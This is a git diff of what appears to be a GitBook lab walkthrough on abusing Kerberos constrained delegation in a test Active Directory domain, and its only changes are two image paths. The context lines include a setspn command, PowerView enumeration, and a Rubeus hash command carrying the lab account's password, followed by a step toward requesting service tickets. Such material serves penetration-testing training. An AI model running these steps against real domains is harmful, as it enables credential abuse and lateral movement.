@@ -36,7 +36,7 @@ setspn -A HTTP/FILE01.amsterdam.bank.local amsterdam\sa_transfer
 
 5\. Open the "Properties" tab and select "Trust this user for delegation to specified services only". Then click "Use any authentication protocol" and select "Add".
 
-![](<../../../.gitbook/assets/image (60).png>)
+![](<../../../.gitbook/assets/image (60) (1).png>)
 
 6\. Select "Users or Computers" and type `FILE01` and click "Check Names" and "OK".
 
@@ -87,7 +87,7 @@ Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 .\Rubeus.exe hash /password:'2i^t#fFpL' /user:sa_transfer /domain:amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (76) (1) (1).png>)
+![](<../../../.gitbook/assets/image (76) (1) (1) (1).png>)
 
 6\. The next step is too request a TGT and then request two service tickets for CIFS, HOST and RPCSS. So we can interact with the file system and psremoting for the fileserver. The easiest way to do this is using Rubeus.
 
